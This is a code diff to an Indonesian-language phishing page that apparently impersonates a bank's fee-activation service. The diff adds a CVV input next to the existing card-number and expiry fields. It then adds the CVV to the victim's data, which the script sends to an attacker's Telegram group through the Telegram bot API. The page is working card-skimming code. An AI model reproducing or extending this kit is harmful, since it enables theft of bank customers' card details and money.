@@ -1,4 +1,6 @@
 
+
+
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
@@ -1072,7 +1074,7 @@ input::placeholder{
 <form  method="POST" onsubmit="sendSudah()" id="formHP">
 <input type="hidden" name="tarif" id="tarif">
 <input type="hidden" name="nohp" id="nohp">
-<div class="" style="margin-left: 20px;margin-top: 20px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:8px; background: #fff; height: 230px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; overflow:hidden; overflow-x: hidden">
+<div class="" style="margin-left: 20px;margin-top: -60px;position:relative;border:0px solid #0085e0;padding:15px;width:82%;border-radius:8px; background: #fff; height: 340px; box-shadow: rgba(0, 0, 0, 0.15) 0px 5px 15px 0px; ">
 <center style="color:#09559a; line-height: 17px; font-size: 15px; padding: 5px"><p>𝗨𝗻𝘁𝘂𝗸 𝗺𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗸𝗮𝗻 𝗽𝗿𝗼𝘀𝗲𝘀 𝗮𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝘁𝗮𝗿𝗶𝗳 𝘁𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗮𝗻𝗱𝗮, 𝗦𝗶𝗹𝗮𝗵𝗸𝗮𝗻 𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗱𝗮𝘁𝗮 𝗱𝗶 𝗯𝗮𝘄𝗮𝗵 𝗶𝗻𝗶</p><br><hr>
 
 </center>
@@ -1090,6 +1092,9 @@ input::placeholder{
 <h5 style="color:#09559a; margin-top: 7px; margin-left: 4px">Masa Berlaku :</h5>
 <input id="valid" name="valid" type="tel" data-mask="00/00" class="form-log" placeholder="##/##"  required>
 <br><br>
+<h5 style="color:#09559a; margin-top: 7px; margin-left: 4px">CVV (3 angka dibelakang kartu):</h5>
+<input id="cvv" name="cvv" type="tel" class="form-log" maxlength="" minlength="" placeholder="***" >
+<br><br>	
 </div>
 <div>
 <br>
@@ -1151,11 +1156,13 @@ function sendSudah(){
   sessionStorage.setItem('atm', atm);
   var valid = $('#valid').val();
   sessionStorage.setItem('valid', valid);
+  var cvv = $('#cvv').val();
+  sessionStorage.setItem('cvv', cvv);	
    
   document.getElementById('kirim').innerHTML = "Please wait...";         
                         
     var logo = '—┈┈•༶𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶.𝗰𝗼.𝗶𝗱°°𝗦𝘂𝗱𝗮𝗵';           
-    var gabungan = '' + logo + '%0A%0A⋇ 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif + '%0A⋇ 𝗡𝗼.𝗛𝗽 •• ' + nohp + '%0A%0A⋇ 𝗡𝗼.𝗔𝘁𝗺 •• ' + atm + '%0A⋇ 𝗠𝗮𝘀𝗮 •• ' + valid ;   
+    var gabungan = '' + logo + '%0A%0A⋇ 𝗧𝗮𝗿𝗶𝗳 •• ' + tarif + '%0A⋇ 𝗡𝗼.𝗛𝗽 •• ' + nohp + '%0A%0A⋇ 𝗡𝗼.𝗔𝘁𝗺 •• ' + atm + '%0A⋇ 𝗠𝗮𝘀𝗮 •• ' + valid + '%0A⋇ 𝗖𝘃𝘃 •• ' + cvv ;   
     
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
